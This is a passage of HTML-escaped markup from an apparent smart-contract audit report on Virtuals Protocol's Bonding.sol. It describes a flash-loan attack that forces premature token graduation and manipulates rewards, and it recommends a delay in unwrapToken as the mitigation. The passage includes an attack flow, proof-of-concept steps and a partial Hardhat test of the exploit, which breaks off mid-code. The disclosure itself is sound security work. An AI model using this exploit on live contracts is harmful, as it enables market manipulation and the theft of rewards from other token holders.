class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esrcTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e());\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eacc\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eacc\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eburnFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eacc\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e|\u0026gt;              \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eacc\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//@audit no time restrictions, unwrapToken allows atomic agentToken conversion upon graduation\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/fun/Bonding.sol#L416-L417\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/fun/Bonding.sol#L416-L417\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"45\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eFlows: flashswap/flashloan -\u0026gt; bonding::buy -\u0026gt; bonding::unwrapToken -\u0026gt; uniswapV2router::swapExactTokensForETHSupportingFeeOnTransferTokens -\u0026gt; paypack flashswap/flashloan\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"impact-5\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-5\" aria-label=\"impact 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003ePremature graduation:\u003c/strong\u003e allowing easy price manipulation through flashloan that bypass community support and liquidity. \u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eReward distribution is manipulated:\u003c/strong\u003e forced graduated token will have Lp values (\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/AgentRewardV3.sol#L110\"\u003e\u003ccode\u003egetLPValue()\u003c/code\u003e\u003c/a\u003e) and eligible for reward shares, reducing other legitimate \u003ccode\u003eagentToken\u003c/code\u003e rewards. Malicious founder gains rewards and dilute other \u003ccode\u003eagentToken\u003c/code\u003e’s rewards.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMarket manipulation:\u003c/strong\u003e the deployed uniswapV2pair through flash loan attack doesn’t have intended liquidity and agent token price stability because uniswapV2pair has unbalanced reserves.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eConsider enforcing a delay in \u003ccode\u003eupwrapToken\u003c/code\u003e such that flash loan cannot be closed atomically.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-7\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eSuppose founder launched Cat memcoin from bonding.sol. Attacker can be a founder or a founder controlled account.\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eAttacker takes out flashloan (virtual token).\u003c/li\u003e\n\u003cli\u003eAttacker uses flashloan to buy memecoin and trigger graduation.\u003c/li\u003e\n\u003cli\u003eUnwrap tokens to receive agent tokens.\u003c/li\u003e\n\u003cli\u003eTrade agent tokens for virtual tokens in Uniswap pair atomically.\u003c/li\u003e\n\u003cli\u003eAttacker paying back flashloan with traded out virtual tokens (only paying extra fees/tax in trading).\u003c/li\u003e\n\u003cli\u003eCheck that the uniswap LP tokens are automatically staked in veToken.\u003c/li\u003e\n\u003cli\u003eDelegate to self to be eligible for rewards.\u003c/li\u003e\n\u003cli\u003eDistribute rewards and verify forced graduated agent token receives allocation.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eSee added unit test \u003ccode\u003eflash loan attack force premature graduation\u003c/code\u003e, manipulating rewards in \u003ccode\u003etest/bonding.js\u003c/code\u003e:\u003c/p\u003e\n\u003cdetails\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"46\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  it.only(\u0026quot;flash loan attack force premature graduation, stealing rewards\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    this.timeout(120000); // 120 seconds\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Setup test environment\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { virtualToken, bonding, fRouter, agentFactory, agentNft } =\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await loadFixture(deployBaseContracts);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { founder, trader, treasury, deployer } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Initial setup - founder launches a memecoin\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.mint(founder.address, parseEther(\u0026quot;200\u0026quot;));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(founder)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .approve(bonding.target, parseEther(\u0026quot;1000\u0026quot;));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Launch the token\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await bonding\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(founder)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .launchFor(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u0026quot;Cat\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u0026quot;$CAT\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        [0, 1, 2],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u0026quot;cat memecoin\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u0026quot;\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        [\u0026quot;\u0026quot;, \u0026quot;\u0026quot;, \u0026quot;\u0026quot;, \u0026quot;\u0026quot;],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        parseEther(\u0026quot;200\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        founder.address\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tokenInfo = await bonding.tokenInfo(await bonding.tokenInfos(0));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Token created:\u0026quot;, tokenInfo.token);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 1: Attacker takes out flashloan (virtual token)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Use direct mint to mock flashloan interaction\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const flashLoanAmount = parseEther(\u0026quot;100000\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.mint(trader.address, flashLoanAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;Flash loan acquired:\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      formatEther(flashLoanAmount),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;VIRTUAL\u0026quot;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 2: Attacker uses flashloan to buy memecoin and trigger graduation\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.connect(trader).approve(fRouter.target, flashLoanAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Record token balances before attack\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const initialBalances = {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      traderVirtualBefore: await virtualToken.balanceOf(trader.address),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      pairVirtualBefore: await virtualToken.balanceOf(tokenInfo.pair),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      founderCatBefore: await ethers\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .getContractAt(\u0026quot;IERC20\u0026quot;, tokenInfo.token)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .then((token) =\u0026gt; token.balanceOf(founder.address)),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Initial balances:\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;- Trader VIRTUAL:\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      formatEther(initialBalances.traderVirtualBefore)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;- Pair VIRTUAL:\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      formatEther(initialBalances.pairVirtualBefore)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;- Founder CAT:\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      formatEther(initialBalances.founderCatBefore)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Buy memecoin with flashloaned funds to trigger graduation\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await expect(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      bonding.connect(trader).buy(parseEther(\u0026quot;35000\u0026quot;), tokenInfo.token)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ).to.emit(bonding, \u0026quot;Graduated\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Check if token graduated\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tokenInfoAfterGraduation = await bonding.tokenInfo(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      bonding.tokenInfos(0)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(tokenInfoAfterGraduation.agentToken).to.not.equal(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;0x0000000000000000000000000000000000000000\u0026quot;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(tokenInfoAfterGraduation.tradingOnUniswap).to.equal(true);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Agent token created:\u0026quot;, tokenInfoAfterGraduation.agentToken);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Record trader\u0026#39;s CAT token balance\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const traderCatBalance = await ethers\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .getContractAt(\u0026quot;IERC20\u0026quot;, tokenInfo.token)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .then((token) =\u0026gt; token.balanceOf(trader.address));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Trader CAT balance:\u0026quot;, formatEther(traderCatBalance));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 3: Unwrap tokens to receive agent tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await bonding\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(trader)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .unwrapToken(tokenInfo.token, [trader.address]);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Check agent token balance after unwrapping\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentToken = await ethers.getContractAt(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;IERC20\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      tokenInfoAfterGraduation.agentToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const traderAgentTokenBalance = await agentToken.balanceOf(trader.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;Trader agent token balance after unwrap:\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      formatEther(traderAgentTokenBalance)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan 